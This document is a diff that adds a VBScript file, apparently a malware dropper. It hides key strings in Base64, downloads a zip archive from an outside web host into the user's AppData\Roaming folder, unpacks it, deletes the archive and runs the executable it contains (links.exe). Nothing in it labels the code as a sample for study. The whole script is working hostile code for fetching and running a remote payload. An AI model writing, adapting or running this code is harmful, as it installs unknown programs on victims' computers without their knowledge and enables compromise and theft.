@@ -1,0 +1,138 @@
+' #################################################################
+' by sysv@ 2015
+' #################################################################
+
+Function Base64Decode(ByVal base64String)
+  'rfc1521
+  '1999 Antonin Foller, Motobit Software, http://Motobit.cz
+  Const Base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+  Dim dataLength, sOut, groupBegin
+  
+  'remove white spaces, If any
+  base64String = Replace(base64String, vbCrLf, "")
+  base64String = Replace(base64String, vbTab, "")
+  base64String = Replace(base64String, " ", "")
+  
+  'The source must consists from groups with Len of 4 chars
+  dataLength = Len(base64String)
+  If dataLength Mod 4 <> 0 Then
+    Err.Raise 1, "Base64Decode", "Bad Base64 string."
+    Exit Function
+  End If
+
+  
+  ' Now decode each group:
+  For groupBegin = 1 To dataLength Step 4
+    Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut
+    ' Each data group encodes up To 3 actual bytes.
+    numDataBytes = 3
+    nGroup = 0
+
+    For CharCounter = 0 To 3
+      ' Convert each character into 6 bits of data, And add it To
+      ' an integer For temporary storage.  If a character is a '=', there
+      ' is one fewer data byte.  (There can only be a maximum of 2 '=' In
+      ' the whole string.)
+
+      thisChar = Mid(base64String, groupBegin + CharCounter, 1)
+
+      If thisChar = "=" Then
+        numDataBytes = numDataBytes - 1
+        thisData = 0
+      Else
+        thisData = InStr(1, Base64, thisChar, vbBinaryCompare) - 1
+      End If
+      If thisData = -1 Then
+        Err.Raise 2, "Base64Decode", "Bad character In Base64 string."
+        Exit Function
+      End If
+
+      nGroup = 64 * nGroup + thisData
+    Next
+    
+    'Hex splits the long To 6 groups with 4 bits
+    nGroup = Hex(nGroup)
+    
+    'Add leading zeros
+    nGroup = String(6 - Len(nGroup), "0") & nGroup
+    
+    'Convert the 3 byte hex integer (6 chars) To 3 characters
+    pOut = Chr(CByte("&H" & Mid(nGroup, 1, 2))) + _
+      Chr(CByte("&H" & Mid(nGroup, 3, 2))) + _
+      Chr(CByte("&H" & Mid(nGroup, 5, 2)))
+    
+    'add numDataBytes characters To out string
+    sOut = sOut & Left(pOut, numDataBytes)
+  Next
+
+  Base64Decode = sOut
+End Function
+
+'####################################################################################
+
+set predio = wScript.createObject("WScript.Shell")
+ALFREDO = predio.expandEnvironmentStrings("%USERNAME%")
+
+Dim MARIO, avg, JOAO, us, BONE
+avg = "C:\Users\" & ALFREDO & "\AppData\Roaming" 
+' Create FileSystemObject. So we can apply .createFolder method
+us = Base64Decode("bGlua3MuZXhl")
+JOAO = avg & "\" & us
+
+Set MARIO = CreateObject("Scripting.FileSystemObject")
+If MARIO.FileExists(JOAO) Then
+Wscript.Quit
+End If
+
+dim QQSSSSSSSSSUW,FATIMA,franquia, bagunca
+
+FATIMA = "http://apostilasconcursosbrasil.com/site/concursos/manual/curso/cursos"
+QQSSSSSSSSSUW = "\flores.zip"
+franquia = avg & QQSSSSSSSSSUW
+
+Set MARIO = CreateObject("Scripting.FileSystemObject")
+If MARIO.FileExists(franquia) Then
+  MARIO.DeleteFile(franquia)
+End If
+
+
+' Create an HTTP object
+Set FISICO = CreateObject(Base64Decode("TVNYTUwyLlhNTEhUVFA="))
+
+' Download the specified URL
+FISICO.open "GET", FATIMA, False
+FISICO.send
+
+If FISICO.Status = 200 Then
+  Dim ALESSANDRA
+  Set ALESSANDRA = CreateObject(Base64Decode("QURPREIuU3RyZWFt"))
+  With ALESSANDRA
+    .Type = 1 'adTypeBinary
+    .Open
+    .Write FISICO.responseBody
+    .SaveToFile franquia
+    .Close
+  End With
+  set ALESSANDRA = Nothing
+End If
+
+Set BANDEIRA = CreateObject("Scripting.FileSystemObject")
+If BANDEIRA.FileExists(franquia) Then
+set banheiro = CreateObject("Shell.Application") 
+set macaco=banheiro.NameSpace(franquia).items 
+banheiro.NameSpace(avg).CopyHere(macaco)
+End if
+
+Set xuxa = CreateObject("Scripting.FileSystemObject")
+If xuxa.FileExists(franquia) Then
+xuxa.DeleteFile(franquia) 
+End If
+
+If MARIO.FileExists(JOAO) Then
+Dim JOANA, teste1, var
+Set JOANA = WScript.CreateObject( "WScript.Shell" )
+JOANA.Run(JOAO)
+Set JOANA = Nothing
+End If
+
+'######################################################################################
